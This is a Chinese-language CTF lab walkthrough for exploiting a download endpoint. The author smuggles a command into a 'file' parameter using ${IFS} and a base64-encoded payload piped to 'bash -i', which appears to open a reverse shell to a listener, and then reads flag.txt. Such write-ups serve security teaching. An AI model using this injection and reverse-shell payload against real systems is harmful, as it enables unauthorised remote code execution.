# 任务二解答文档



1. 安装FTP客户端，使用python的FTP模组

```
# 安装pyftpdlib
pip install pyftpdlib

# 当前目录下启动一个ftp服务器，默认监听在 `0.0.0.0:2121` 端口
# 这个监听端口肯定是可以自己设置的哈
python -m pyftpdlib -p 2121 -i 0.0.0.0
```

这一步得到的结果

![image-20240416165044886](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416165044886.png)



2. 把注入代码转化为 `base64` 规则

![image-20240416170007339](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170007339.png)

3. 得到的`base64`结果需要`URL`编码，对其中 `+` 替换为 `%2B`， `/` 替换为 `%2F`.

例如上述结果转化为`bHMgLyA%2B......`

4. 编写`listen.py`监听脚本并执行，

   显示 `listening` 正在监听

   ![image-20240416170129281](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170129281.png)

   ![image-20240416170134277](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170134277.png)

5. 浏览器访问`ip:8080`端口，得到可复制url部分

   ![image-20240416170316437](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170316437.png)

6. `http://ip:port/download?uri=ftp://ftp-client-ip:port/&file=|bash${IFS}-
   c${IFS}%27{echo,YmFzaCAtaSA%2BJiAvZGV2L3....}|{base64,-d}|{bash,-i}%27`

这里面`YmFzaCAtaSA%2BJiAvZGV2L3....`是上述获得的转化后注入段码值

![image-20240416170604396](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170604396.png)



7. 我们可以在监听terminal中看到如下结果，因为刚刚的注入码中，执行的是`ls /`

![image-20240416170622906](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170622906.png)

8. 看到了`flag.txt`，只需要将cat 它的命令转码（获得的base64规则码记得转URL）就可以访问到了（操作类似上述）

![image-20240416170827051](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170827051.png)

![image-20240416170836028](C:\Users\20607\AppData\Roaming\Typora\typora-user-images\image-20240416170836028.png)

9. 现在你就能获取到反弹的flag。==注意：这一题是动态结果，答案跟别的同学不一样是OK的==